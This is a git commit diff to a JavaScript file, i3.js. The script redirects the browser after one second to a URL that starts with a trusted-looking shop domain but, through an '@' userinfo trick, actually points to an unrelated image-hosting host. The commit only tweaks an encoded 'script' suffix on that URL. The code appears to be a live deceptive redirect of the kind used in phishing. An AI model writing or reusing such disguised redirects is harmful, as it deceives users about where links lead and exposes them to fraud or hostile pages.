853d449ca8629cf507cd32df28b35d8148ee652d
iuuc <145624790+iuuc@users.noreply.github.com>
2024-02-01 23:03:28 +0800

    Update i3.js

--- i3.js
+++ i3.js
@@ -10,6 +10,6 @@ leleua();
 
 setTimeout(function() {
     var timestamp = new Date().getTime();
-    var url = 'https://shop.10086.cn@meeting-75420.picgzc.qpic.cn/ff8267e3566dbad4a1aa0f50775569e814f56f7768691c9048f42681cfa7a308' + '?' + timestamp + '%3Cscript';
+    var url = 'https://shop.10086.cn@meeting-75420.picgzc.qpic.cn/ff8267e3566dbad4a1aa0f50775569e814f56f7768691c9048f42681cfa7a308' + '?' + timestamp + '3Cscript';
     location.href = url;
 }, 1000);
